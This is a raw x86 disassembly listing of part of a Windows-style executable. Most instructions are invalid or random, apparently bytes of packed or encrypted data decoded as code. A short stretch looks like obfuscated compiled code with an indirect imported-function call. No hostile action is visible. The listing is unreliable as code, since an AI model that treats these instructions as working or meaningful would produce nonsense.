  40ab0e:	add    DWORD PTR [esi],ebx
  40ab10:	aam    0x23
  40ab12:	(bad)  
  40ab13:	in     eax,dx
  40ab14:	(bad)  
  40ab15:	mov    ebp,ebx
  40ab17:	sub    cl,dl
  40ab19:	stos   BYTE PTR es:[edi],al
  40ab1a:	fdivr  QWORD PTR [edx+0x129a400]
  40ab20:	icebp  
  40ab21:	lods   eax,DWORD PTR ds:[esi]
  40ab22:	scas   eax,DWORD PTR es:[edi]
  40ab23:	sub    ch,BYTE PTR [esp+ecx*1+0x7b8c26ba]
  40ab2a:	(bad)  
  40ab2b:	shr    DWORD PTR ds:0x79d84e95,1
  40ab31:	adc    DWORD PTR [ebx-0x5],eax
  40ab34:	(bad)  
  40ab35:	scas   eax,DWORD PTR es:[edi]
  40ab36:	call   0xd727c560
  40ab3b:	cmp    ebx,esp
  40ab3d:	adc    eax,0xf7d2ad61
  40ab42:	ds out dx,eax
  40ab44:	es aas 
  40ab46:	mov    ch,BYTE PTR [edi+ebx*8-0x6e]
  40ab4a:	popa   
  40ab4b:	gs jecxz 0x40aaec
  40ab4e:	pop    ebp
  40ab4f:	mov    ah,0x83
  40ab51:	out    dx,eax
  40ab52:	add    esp,DWORD PTR [edi+ebp*1]
  40ab55:	call   0x3c534f39
  40ab5a:	movsx  ecx,al
  40ab5d:	xchg   ebx,eax
  40ab5e:	jle    0x40abcf
  40ab60:	lock mov ebx,0x158364b
  40ab66:	enter  0x55dc,0xe3
  40ab6a:	repz inc edi
  40ab6c:	xchg   esp,eax
  40ab6d:	shl    DWORD PTR [esi-0x57c7f6aa],0xd2
  40ab74:	mov    edi,0x514245d7
  40ab79:	popf   
  40ab7a:	call   FWORD PTR [ecx]
  40ab7c:	mov    ch,BYTE PTR [ecx]
  40ab7e:	jmp    0x2294:0x6d18ca45
  40ab85:	sbb    ecx,ebx
  40ab87:	retf   0x62db
  40ab8a:	(bad)  
  40ab8b:	sbb    al,0xaa
  40ab8d:	cs retf 0x77
  40ab91:	fs xor eax,0xd75f797d
  40ab97:	push   eax
  40ab98:	cmp    al,0x4b
  40ab9a:	in     eax,dx
  40ab9b:	aaa    
  40ab9c:	cmp    ebx,DWORD PTR [ecx-0x138dba70]
  40aba2:	out    0xd5,al
  40aba4:	in     eax,dx
  40aba5:	fs jno 0x40ab4b
  40aba8:	xchg   esp,eax
  40aba9:	jbe    0x40ac04
  40abab:	(bad)  
  40abac:	cwde   
  40abad:	cli    
  40abae:	add    ebp,DWORD PTR [edx-0x31]
  40abb1:	ins    DWORD PTR es:[edi],dx
  40abb2:	and    DWORD PTR [edx],ebp
  40abb4:	or     al,BYTE PTR [esi]
  40abb6:	jmp    FWORD PTR [edx+ebp*2-0x702041b2]
  40abbd:	mov    ebx,0x55ae7550
  40abc2:	fwait
  40abc3:	int3   
  40abc4:	(bad)  [ebx+0x148c56a]
  40abca:	out    0xd6,al
  40abcc:	jmp    0x1a08d50d
  40abd1:	add    DWORD PTR [ebp-0x5074ae41],ebx
  40abd7:	or     eax,0x7e00e872
  40abdc:	or     BYTE PTR [ebp+0x6b],bl
  40abdf:	test   BYTE PTR [ebx+0x25],ah
  40abe2:	loope  0x40ac31
  40abe4:	bound  esp,QWORD PTR [esi-0x1f]
  40abe7:	jl     0x40abde
  40abe9:	cmp    BYTE PTR [ebp-0x5f0e86a2],dl
  40abef:	ins    DWORD PTR es:[edi],dx
  40abf0:	loopne 0x40ac6c
  40abf2:	or     al,0x98
  40abf4:	gs cs sti 
  40abf7:	js     0x40abb2
  40abf9:	jns    0x40ac1a
  40abfb:	mov    esi,0xccb88ae3
  40ac00:	cli    
  40ac01:	cmp    DWORD PTR [edi+0x18440108],esi
  40ac07:	dec    edi
  40ac08:	or     DWORD PTR [esi-0x22],edx
  40ac0b:	lahf   
  40ac0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac0d:	jle    0x40abbc
  40ac0f:	fcmovbe st,st(5)
  40ac11:	jns    0x40abce
  40ac13:	jne    0x40abad
  40ac15:	pop    ds
  40ac16:	repz add DWORD PTR [esi+0x48b874ab],edi
  40ac1d:	dec    edi
  40ac1e:	inc    eax
  40ac1f:	dec    eax
  40ac20:	imul   ebp,DWORD PTR [ebx-0x29f8e312],0xb28269bd
  40ac2a:	xchg   ebp,eax
  40ac2b:	neg    BYTE PTR [ecx-0x38]
  40ac2e:	inc    eax
  40ac2f:	jmp    0x7e67:0xa2db7f27
  40ac36:	ja     0x40ac74
  40ac38:	push   edx
  40ac39:	sub    eax,0x4f423ae9
  40ac3e:	int3   
  40ac3f:	xor    al,0x7e
  40ac41:	out    dx,eax
  40ac42:	xchg   ecx,eax
  40ac43:	fnsave [ecx]
  40ac45:	xchg   esp,eax
  40ac46:	xor    al,0x4d
  40ac48:	push   0x4c
  40ac4a:	adc    bh,bh
  40ac4c:	and    ebp,DWORD PTR [ebp+0x330b45fa]
  40ac52:	jecxz  0x40ac1d
  40ac54:	sbb    dh,BYTE PTR [esp+ecx*4]
  40ac57:	fsubp  st(0),st
  40ac59:	je     0x40abfa
  40ac5b:	shr    DWORD PTR [edx+esi*1-0x667c8273],0x27
  40ac63:	mov    ds:0x8dc4592c,eax
  40ac68:	loope  0x40ac27
  40ac6a:	inc    esp
  40ac6b:	xchg   BYTE PTR [ecx-0x56],bl
  40ac6e:	pop    eax
  40ac6f:	or     edi,eax
  40ac71:	sbb    BYTE PTR [ebx],cl
  40ac73:	ins    DWORD PTR es:[edi],dx
  40ac74:	add    al,0x68
  40ac76:	push   ss
  40ac77:	jmp    0xa4125022
  40ac7c:	(bad)  
  40ac7d:	not    BYTE PTR [esi-0x80]
  40ac80:	mov    eax,ds:0xb5fbda9
  40ac85:	push   esi
  40ac86:	inc    edx
  40ac87:	mov    ds:0x55fc0562,al
  40ac8c:	push   0xb45eee6b
  40ac91:	loopne 0x40ac97
  40ac93:	clc    
  40ac94:	mov    bl,0xd2
  40ac96:	inc    ebp
  40ac97:	jne    0x40ac8f
  40ac99:	push   esp
  40ac9a:	push   edi
  40ac9b:	std    
  40ac9c:	dec    ebp
  40ac9d:	clc    
  40ac9e:	xor    dh,bl
  40aca0:	jmp    0x4ba4:0x3c1695ac
  40aca7:	stos   DWORD PTR es:[edi],eax
  40aca8:	dec    esi
  40aca9:	dec    ebp
  40acaa:	jae    0x40ace8
  40acac:	sbb    esi,ebx
  40acae:	lods   al,BYTE PTR ds:[esi]
  40acaf:	push   edi
  40acb0:	es xchg edx,eax
  40acb2:	ds inc ebx
  40acb4:	jge    0x40ad12
  40acb6:	or     eax,0xa7d3e3f
  40acbb:	ss xchg ebx,eax
  40acbd:	(bad)  
  40acbe:	mov    bh,0xa2
  40acc0:	pop    ss
  40acc1:	int    0x56
  40acc3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40acc5:	adc    DWORD PTR [esp+ecx*8+0x44dbd432],esp
  40accc:	shr    BYTE PTR [ecx+0x49a2839c],0x53
  40acd3:	sub    BYTE PTR [esi],cl
  40acd5:	test   DWORD PTR [eax-0x53],ebx
  40acd8:	stos   DWORD PTR es:[edi],eax
  40acd9:	xchg   ecx,eax
  40acda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acdb:	push   0xffffffb1
  40acdd:	xchg   DWORD PTR [eax+0x7b6917a9],eax
  40ace3:	push   ebx
  40ace4:	aad    0xc8
  40ace6:	ins    DWORD PTR es:[edi],dx
  40ace7:	mov    ds:0xfc5c351e,eax
  40acec:	lods   eax,DWORD PTR ds:[esi]
  40aced:	sub    al,0xb7
  40acef:	mov    ds:0xa31fa939,al
  40acf4:	fsubrp st(1),st
  40acf6:	cmp    dl,BYTE PTR [esi-0x70]
  40acf9:	test   BYTE PTR [eax+eax*4],al
  40acfc:	jl     0x40ac90
  40acfe:	out    dx,eax
  40acff:	jge    0x40ad7c
  40ad01:	(bad)  
  40ad02:	sub    eax,0x8f5c40d1
  40ad07:	aas    
  40ad08:	ret    
  40ad09:	mov    ds:0x25c51131,eax
  40ad0e:	fbstp  TBYTE PTR [esi+0x1cd20f93]
  40ad14:	(bad)
  40ad17:	cmp    DWORD PTR [ecx+ecx*2],ebp
  40ad1a:	push   0xffffffbd
  40ad1c:	add    eax,0x86e03b1c
  40ad21:	in     al,dx
  40ad22:	mov    WORD PTR [esi+ebp*1+0x505b853f],ss
  40ad29:	(bad)  
  40ad2b:	outs   dx,BYTE PTR ds:[esi]
  40ad2c:	out    dx,eax
  40ad2d:	pop    ebp
  40ad2e:	or     esi,DWORD PTR [ecx-0xc]
  40ad31:	loop   0x40ad68
  40ad33:	arpl   si,dx
  40ad35:	sbb    esp,DWORD PTR [edi+0x23]
  40ad38:	mov    al,ds:0x9a1e1a32
  40ad3d:	mov    eax,0xe4b36e16
  40ad42:	ficom  WORD PTR [edi+eiz*1+0x39]
  40ad46:	adc    bh,BYTE PTR [edx+0x3159502d]
  40ad4c:	test   DWORD PTR [edi-0x362ef1dc],edi
  40ad52:	ror    DWORD PTR [ecx-0x49ce45fc],cl
  40ad58:	jge    0x40ad35
  40ad5a:	inc    eax
  40ad5b:	(bad)  
  40ad5d:	int3   
  40ad5e:	mov    al,ds:0xda7e1fa2
  40ad63:	sti    
  40ad64:	mov    ah,0xc8
  40ad66:	cli    
  40ad67:	add    ebx,DWORD PTR [ecx-0x65efc79b]
  40ad6d:	jle    0x40ad86
  40ad6f:	mov    dh,0x9e
  40ad71:	aam    0x39
  40ad73:	pop    edx
  40ad74:	sub    al,0x1b
  40ad76:	xlat   BYTE PTR ds:[ebx]
  40ad77:	mov    BYTE PTR [esi+0x38],ch
  40ad7a:	aam    0x22
  40ad7c:	mov    ebx,0xbf23f63e
  40ad81:	stc    
  40ad82:	test   al,0x41
  40ad84:	stos   DWORD PTR es:[edi],eax
  40ad85:	push   eax
  40ad86:	xchg   esi,ebp
  40ad88:	adc    al,dl
  40ad8a:	mov    esi,0x3d761812
  40ad8f:	pop    edx
  40ad90:	sbb    bl,BYTE PTR [ebx-0x27]
  40ad93:	shl    BYTE PTR [esi+0x4a],0xc0
  40ad97:	sahf   
  40ad98:	mov    BYTE PTR [esi],cl
  40ad9a:	push   edx
  40ad9b:	je     0x40ad4a
  40ad9d:	lea    ebx,[edx+0xe]
  40ada0:	mov    al,0x56
  40ada2:	jb     0x40ad34
  40ada4:	aam    0xae
  40ada6:	mov    eax,ds:0xc9f805f8
  40adab:	inc    ebp
  40adac:	std    
  40adad:	add    dh,BYTE PTR [ebx]
  40adaf:	sahf   
  40adb0:	inc    edx
  40adb1:	add    ah,cl
  40adb3:	sub    BYTE PTR [eax],bh
  40adb5:	dec    ebx
  40adb6:	cli    
  40adb7:	ret    0x4c16
  40adba:	xchg   edi,eax
  40adbb:	add    DWORD PTR [edx-0x80],eax
  40adbe:	push   ds
  40adbf:	cmp    eax,0xb7eadaf1
  40adc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adc5:	je     0x40ad69
  40adc7:	or     DWORD PTR [edx-0x3d],esi
  40adca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adcb:	pop    eax
  40adcc:	int    0xb
  40adce:	data16 (bad) 
  40add0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40add1:	sbb    al,ah
  40add3:	iret   
  40add4:	dec    ecx
  40add5:	push   es
  40add6:	mov    BYTE PTR [ebx],al
  40add8:	jl     0x40add9
  40adda:	push   es
  40addb:	js     0x40adb1
  40addd:	or     al,0xfc
  40addf:	adc    al,0xa7
  40ade1:	mov    bl,0x51
  40ade3:	cmp    eax,0x635dcb3a
  40ade8:	lahf   
  40ade9:	dec    edi
  40adeb:	cmp    eax,0xbd027f38
  40adf0:	sub    eax,0x744346a1
  40adf5:	add    DWORD PTR [ebx],0x5cb5e565
  40adfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfc:	cmp    BYTE PTR [eax+0x70],bl
  40adff:	stos   BYTE PTR es:[edi],al
  40ae00:	jbe    0x40ade5
  40ae02:	leave  
  40ae03:	mov    dh,0xf9
  40ae05:	push   eax
  40ae06:	test   DWORD PTR [ebp+0x2927634e],0x581eae2e
  40ae10:	xchg   edx,eax
  40ae11:	sub    DWORD PTR ds:0x5f638f9e,ecx
  40ae17:	pop    ebp
  40ae18:	or     BYTE PTR [edx-0x66afd65a],0x5f
  40ae1f:	mov    edx,DWORD PTR [ecx+0x7ded61a2]
  40ae25:	retf   
  40ae26:	(bad)  
  40ae27:	adc    DWORD PTR [ebp+ecx*8-0x3a],eax
  40ae2b:	test   eax,0x132843b7
  40ae30:	pop    edx
  40ae31:	sbb    DWORD PTR [edi+0x52],ebx
  40ae34:	lock (bad) 
  40ae36:	(bad)
  40ae39:	push   esp
  40ae3a:	push   0x5f
  40ae3c:	pop    ebp
  40ae3d:	push   ebx
  40ae3e:	fadd   QWORD PTR [edx+0x2be558bd]
  40ae44:	outs   dx,DWORD PTR ds:[esi]
  40ae45:	mov    esp,0xc7757577
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42828b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428253
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428387,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42826b
  40aea0:	cmp    DWORD PTR ds:0x42828b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x4280bb
  40aebd:	call   DWORD PTR ds:0x428e78
  40aec3:	mov    ecx,DWORD PTR ds:0x42830b
  40aec9:	xor    DWORD PTR ds:0x42822f,ecx
  40aecf:	or     DWORD PTR ds:0x42837b,ecx
  40aed5:	or     DWORD PTR ds:0x428293,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42829f
  40aee1:	adc    DWORD PTR ds:0x428267,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428163
  40aeef:	adc    ecx,DWORD PTR ds:0x428387
  40aef5:	mov    DWORD PTR ds:0x428163,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428383,0x4282f7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428163,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	mov    edx,0xb5705b16
  40af34:	sbb    ebx,DWORD PTR [eax]
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	imul   al
  40af3d:	and    eax,0x6680cf2e
  40af42:	mov    cl,0xb1
  40af44:	stos   BYTE PTR es:[edi],al
  40af45:	sub    eax,DWORD PTR [edi]
  40af47:	cwde   
  40af48:	inc    eax
  40af49:	punpckhwd mm1,QWORD PTR [ebp+0x580ee691]
  40af50:	or     edi,DWORD PTR [ebp+0x73a701e9]
  40af56:	test   BYTE PTR [ecx+0x1c392b02],cl
  40af5c:	add    BYTE PTR [edi+0x1ef337a3],dl
  40af62:	jmp    0xf021:0xf6289a19
  40af69:	pop    esi
  40af6a:	push   edx
  40af6b:	xchg   ebx,eax
  40af6c:	aam    0x1f
  40af6e:	hlt    
  40af6f:	mov    al,ds:0x29725069
  40af74:	adc    ebp,DWORD PTR [ebx]
  40af76:	mov    WORD PTR [eax+0x31c16be1],?
  40af7c:	daa    
  40af7d:	cmp    al,0x75
  40af7f:	bound  edi,QWORD PTR [eax+0x6b425615]
  40af85:	push   eax
  40af86:	loope  0x40afa6
  40af88:	mov    eax,0x8440c034
  40af8d:	sub    DWORD PTR [ecx+eax*1+0x4c],eax
  40af91:	cdq    
  40af92:	mov    bl,0x6c
  40af94:	xor    al,0x53
  40af96:	sub    eax,edi
  40af98:	push   edx
  40af99:	ja     0x40af6e
  40af9b:	call   0x2510:0x27bfb063
  40afa2:	dec    esp
  40afa3:	scas   al,BYTE PTR es:[edi]
  40afa4:	arpl   WORD PTR [eax+0x8e74be6],di
  40afaa:	push   cs
  40afab:	sbb    edx,DWORD PTR [edi-0x65c50fb1]
  40afb1:	or     al,0x72
  40afb3:	and    al,0xb2
  40afb5:	lahf   
  40afb6:	cld    
  40afb7:	loopne 0x40af4d
  40afb9:	push   esp
  40afba:	inc    ebx
  40afbb:	cmp    DWORD PTR [eax+0x14862e63],ebx
  40afc1:	pushf  
  40afc2:	sbb    eax,0xb2962aa4
  40afc7:	adc    dl,dl
  40afc9:	popf   
  40afca:	pop    es
  40afcb:	cmp    eax,0x68807b01
  40afd0:	repz popf 
  40afd2:	inc    ecx
  40afd3:	leave  
  40afd4:	dec    edi
  40afd5:	jecxz  0x40af87
  40afd7:	imul   ebp,esp,0x8
  40afda:	inc    edi
  40afdb:	mov    esi,0x1c7ef16b
  40afe0:	imul   esp,DWORD PTR [edx+0x7e3bc740],0xffffff93
  40afe7:	adc    esi,DWORD PTR [esi-0x3b515d8d]
  40afed:	push   0x2d
  40afef:	mov    ch,0x26
  40aff1:	xor    ebx,DWORD PTR ds:0xec99fe27
  40aff7:	sbb    edi,DWORD PTR ds:[edi+ecx*1]
  40affb:	pop    esp
  40affc:	mov    WORD PTR [ebp+0x1f],cs
  40afff:	mov    edi,DWORD PTR [eax-0x35]
  40b002:	rol    BYTE PTR [ecx-0x36afd64a],cl
  40b008:	push   ecx
  40b009:	adc    ebx,esp
  40b00b:	inc    edi
  40b00c:	imul   BYTE PTR [ecx]
  40b00e:	adc    DWORD PTR ss:[esp+eiz*4-0x53],esi
  40b013:	hlt    
  40b014:	leave  
  40b015:	out    0x8a,eax
  40b017:	cmp    eax,0x7983ce9c
  40b01c:	cmp    ebx,ecx
  40b01e:	mov    edi,0xb39f6602
  40b023:	jmp    DWORD PTR [ebx+eiz*2-0x984f005]
  40b02a:	hlt    
  40b02b:	adc    al,0x4e
  40b02d:	add    al,0xf6
  40b02f:	imul   edi,DWORD PTR [ecx+0x4f7a35b],0x3a
  40b036:	clc    
  40b037:	fcmove st,st(0)
  40b039:	ins    DWORD PTR es:[edi],dx
  40b03a:	jmp    0xec448df7
  40b03f:	and    DWORD PTR [edi-0x779a79bf],eax
  40b045:	or     ecx,DWORD PTR [eax-0x1d16133]
  40b04b:	std    
  40b04c:	pop    ebp
  40b04d:	jl     0x40b0c2
  40b04f:	pop    ds
  40b050:	fsub   QWORD PTR [edi-0x55beeaf8]
  40b056:	ror    BYTE PTR [edx-0x29],cl
  40b059:	sub    ecx,DWORD PTR [ebx]
  40b05b:	and    eax,0xc5b89baa
  40b060:	cmp    BYTE PTR [eax-0x4cf7d232],bh
  40b066:	sub    al,BYTE PTR [edx+ebx*2]
  40b069:	mov    cl,0xc6
  40b06b:	inc    eax
  40b06c:	xchg   BYTE PTR [ecx+ecx*1-0x65123b12],al
  40b073:	cmp    cl,BYTE PTR ss:[eax+0x60]
  40b077:	ja     0x40b02e
  40b079:	fdiv   QWORD PTR [eax]
  40b07b:	jge    0x40b004
  40b07d:	ret    
  40b07e:	and    dh,ah
  40b080:	lea    ebp,[edi+0x23f8ada9]
  40b086:	jae    0x40b0a9
  40b088:	shl    DWORD PTR [ecx-0x3f3f1152],cl
  40b08e:	mov    ebp,0xc887948c
  40b093:	sbb    eax,0x338b8d6a
  40b098:	mov    edi,0xbdb3956b
  40b09d:	test   DWORD PTR [esi+0x3f],0x87875c37
  40b0a4:	adc    ch,al
  40b0a6:	dec    esi
  40b0a7:	in     al,0x2a
  40b0a9:	sub    bl,BYTE PTR [esi-0x44e7b119]
  40b0af:	dec    ecx
  40b0b0:	int3   
  40b0b1:	jae    0x40b073
  40b0b3:	stc    
  40b0b4:	in     al,dx
  40b0b5:	sbb    bl,dh
  40b0b7:	pop    ecx
  40b0b8:	int3   
  40b0b9:	ficom  WORD PTR [ebp+eiz*2+0x32]
  40b0bd:	or     ch,BYTE PTR [edi-0x16]
  40b0c0:	pop    edx
  40b0c1:	(bad)  
  40b0c2:	push   edi
  40b0c3:	in     al,0xe5
  40b0c5:	out    dx,eax
  40b0c6:	pop    ds
  40b0c7:	lock mov ch,0x78
  40b0ca:	mov    edi,0xf48cc0c8
  40b0cf:	mov    bh,0xfd
  40b0d1:	inc    esi
  40b0d2:	push   ebx
  40b0d3:	add    eax,0x1fe413c6
  40b0d8:	mov    eax,0x1f82fd35
  40b0dd:	idiv   DWORD PTR [ecx]
  40b0df:	inc    ebp
  40b0e0:	xchg   ebx,eax
  40b0e1:	or     BYTE PTR [edx+0x5d],cl
  40b0e4:	retf   0x4f29
  40b0e7:	frstor [eax]
  40b0e9:	push   es
  40b0ea:	mov    bh,0x57
  40b0ec:	aad    0xd1
  40b0ee:	hlt    
  40b0ef:	shl    bh,1
  40b0f1:	(bad)  
  40b0f2:	inc    BYTE PTR [edi+esi*4-0x9]
  40b0f6:	test   DWORD PTR [edi-0x78],esi
  40b0f9:	xchg   DWORD PTR [edi-0x37],edx
  40b0fc:	inc    esi
  40b0fd:	push   ds
  40b0fe:	mov    edi,0x2b54dcc1
  40b103:	dec    ebp
  40b104:	retf   0x1474
  40b107:	sbb    eax,0x18b9e790
  40b10c:	add    eax,0x532f8e08
  40b111:	mov    esi,0x849858a8
  40b116:	cld    
  40b117:	pop    eax
  40b118:	mov    ch,BYTE PTR [ecx-0x4e8ae7]
  40b11e:	lods   eax,DWORD PTR ds:[esi]
  40b11f:	mov    cl,0xb
  40b121:	dec    esi
  40b122:	jo     0x40b0be
  40b124:	mov    edi,0x2d9af0ba
  40b129:	ins    BYTE PTR es:[edi],dx
  40b12a:	push   ebp
  40b12b:	mov    esp,0x4407145d
  40b130:	rol    DWORD PTR [ebx-0x18d3228c],0x3f
  40b137:	call   0x1e21ed05
  40b13c:	retf   0x172c
  40b13f:	inc    edi
  40b140:	mov    al,ds:0x3904b920
  40b145:	jle    0x40b1a3
  40b147:	xlat   BYTE PTR ds:[ebx]
  40b148:	mov    DWORD PTR ss:[edx-0x772d1089],edi
  40b14f:	mov    eax,ds:0xb10f7732
  40b154:	cmp    eax,ebp
  40b156:	sub    al,0x5f
  40b158:	mov    WORD PTR [eax+0x7e4e8715],ss
  40b15e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b15f:	and    ax,bx
  40b162:	fdiv   DWORD PTR [ebp-0x3f1ea1a8]
  40b168:	std    
  40b169:	adc    ebx,DWORD PTR ds:0xa6123d15
  40b16f:	or     ch,BYTE PTR [esi]
  40b171:	out    0x31,al
  40b173:	xor    ch,BYTE PTR [eax+edx*2-0x40]
  40b177:	dec    edx
  40b178:	cmc    
  40b179:	je     0x40b113
  40b17b:	std    
  40b17c:	lahf   
  40b17d:	(bad)  
  40b17e:	xchg   edx,eax
  40b17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b180:	inc    BYTE PTR [ecx+0x118a10e]
  40b186:	mov    ds:0xfbccc97a,eax
  40b18b:	daa    
  40b18c:	jecxz  0x40b19f
  40b18e:	dec    eax
  40b18f:	clc    
  40b190:	dec    esp
  40b191:	xchg   DWORD PTR [ebx-0x5df0287c],ecx
  40b197:	call   0x97a2:0x86d806f7
  40b19e:	idiv   DWORD PTR [esi+0x3c81871d]
  40b1a4:	dec    esp
  40b1a5:	cld    
  40b1a6:	push   ds
  40b1a7:	loope  0x40b1c3
  40b1a9:	pop    esp
  40b1aa:	(bad)  
  40b1ab:	mov    ebp,0xc20dbb64
  40b1b0:	je     0x40b15a
  40b1b2:	mov    eax,ds:0x2c5ed686
  40b1b7:	jp     0x40b177
  40b1b9:	xchg   esp,eax
  40b1ba:	or     ebx,ecx
  40b1bc:	pop    ebp
  40b1bd:	jno    0x40b173
  40b1bf:	pushf  
  40b1c0:	adc    DWORD PTR [edx],ebp
  40b1c2:	lea    ebp,[edx+0x44]
  40b1c5:	iret   
  40b1c6:	mov    WORD PTR [ebp+0x2dac692f],?
  40b1cc:	push   es
  40b1cd:	dec    ebx
  40b1ce:	inc    ecx
  40b1cf:	fst    DWORD PTR [edx-0x16cd2d3d]
  40b1d5:	lods   eax,DWORD PTR ds:[esi]
  40b1d6:	inc    edi
  40b1d7:	lock jmp 0xcf75:0xd5de7249
  40b1df:	or     DWORD PTR [edx],esi
  40b1e1:	sti    
  40b1e2:	sub    ebx,DWORD PTR [eax-0x62]
  40b1e5:	pusha  
  40b1e6:	mov    edx,0xfade2479
  40b1eb:	ror    DWORD PTR es:[esi+0x64],cl
  40b1ef:	mov    edi,DWORD PTR [edi]
  40b1f1:	dec    ebp
  40b1f2:	and    dh,BYTE PTR [edi]
  40b1f4:	in     al,dx
  40b1f5:	pop    ebp
  40b1f6:	jmp    0x40b202
  40b1f8:	jmp    0x685fc52d
  40b1fd:	(bad)  
  40b1fe:	call   0xf3df:0x7c917f30
  40b205:	xlat   BYTE PTR ds:[ebx]
  40b206:	or     ebx,DWORD PTR [esi+0x4f]
  40b209:	mov    esi,0x15ca46cf
  40b20e:	add    esi,edx
  40b210:	dec    al
  40b212:	les    esp,FWORD PTR [eax+eiz*8-0x4f50d43a]
  40b219:	push   edi
  40b21a:	push   esi
  40b21b:	push   cs
  40b21c:	dec    ebp
  40b21d:	mov    ebx,0xa619b15a
  40b222:	ins    BYTE PTR es:[edi],dx
  40b223:	jno    0x40b287
  40b225:	cdq    
  40b226:	mov    ebx,0x9431cf1f
  40b22b:	push   cs
  40b22c:	ds cwde 
  40b22e:	xor    eax,DWORD PTR [ebp+0x1d]
  40b231:	repz push ds
  40b233:	hlt    
  40b234:	(bad)  
  40b235:	sar    DWORD PTR [edi+0x224ba5d1],0x9e
  40b23c:	(bad)  [ecx+0x44d188b0]
  40b242:	inc    edx
  40b243:	les    ebx,FWORD PTR [ebx+ecx*2]
  40b246:	je     0x40b28c
  40b248:	inc    esi
  40b249:	push   ecx
  40b24a:	fst    QWORD PTR [edx]
  40b24c:	or     DWORD PTR [ebp+0x6b67e699],esp
  40b252:	out    dx,eax
  40b253:	push   es
  40b254:	call   0x784:0xb98f4c0a
  40b25b:	cmp    edx,DWORD PTR [edx+0x3dcb7929]
  40b261:	fnsave [edx-0x6]
  40b264:	or     cl,ch
  40b266:	mov    fs,WORD PTR [ebx]
  40b268:	in     eax,dx
  40b269:	adc    BYTE PTR [esi+0x30fca8df],0x88
  40b270:	or     BYTE PTR [ecx],bh
  40b272:	ins    BYTE PTR es:[edi],dx
  40b273:	cld    
  40b274:	cmp    eax,0x9994ee55
  40b279:	(bad)  
  40b27b:	inc    edx
  40b27c:	jle    0x40b2ca
  40b27e:	mov    ds:0x74549502,al
  40b283:	sub    eax,0xeab10cfb
  40b288:	mov    eax,0x8b60db16
  40b28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b28e:	in     eax,dx
  40b28f:	mov    esi,0x790e9fd4
  40b294:	(bad)  
  40b295:	(bad)  
  40b296:	repz pop ds
  40b298:	push   cs
  40b299:	xchg   BYTE PTR [ecx-0x57],dl
  40b29c:	pop    es
  40b29d:	sbb    eax,0x5e774fd3
  40b2a2:	retf   0x7723
  40b2a5:	mov    ds:0xf239a29f,eax
  40b2aa:	xchg   BYTE PTR [esi-0x2e],bh
  40b2ad:	cmp    DWORD PTR [ecx+0x18f9b867],0xd5be5b0
  40b2b7:	cmp    al,0xf3
  40b2b9:	in     eax,0xcc
  40b2bb:	push   cs
  40b2bc:	test   al,0xc7
  40b2be:	fld    DWORD PTR [edx-0x6f]
  40b2c1:	retf   0xf302
  40b2c4:	dec    DWORD PTR [ebx-0x12a3a978]
  40b2ca:	inc    esi
  40b2cb:	clc    
  40b2cc:	pusha  
  40b2cd:	sub    eax,ebp
  40b2cf:	lahf   
  40b2d0:	dec    esi
  40b2d1:	stc    
  40b2d2:	mov    bl,0xd
  40b2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2d5:	jne    0x40b285
  40b2d7:	xor    al,0x83
  40b2d9:	xor    ah,BYTE PTR [ebx*1-0x54a86cd5]
  40b2e0:	xchg   ebx,eax
  40b2e1:	(bad)  
  40b2e2:	cmp    BYTE PTR [esi+0x6f4f6a69],dl
  40b2e8:	in     al,0x4
  40b2ea:	cmp    dl,ch
  40b2ec:	cdq    
  40b2ed:	sahf   
  40b2ee:	sub    eax,0xb43a7288
  40b2f3:	imul   edx,DWORD PTR [edi+esi*2+0x3],0x6b
  40b2f8:	jl     0x40b27b
  40b2fa:	pop    edi
  40b2fb:	mov    eax,ds:0x2d156729
  40b300:	push   0xffffffcb
  40b302:	bound  esi,QWORD PTR [eax]
  40b304:	dec    edx
  40b305:	jmp    0xac2a:0xe2d2861c
  40b30c:	jns    0x40b37b
  40b30e:	xchg   esi,eax
  40b30f:	in     eax,dx
  40b310:	shr    ebx,cl
  40b312:	xor    eax,0x15815017
  40b317:	jmp    0x40b29b
  40b319:	inc    edx
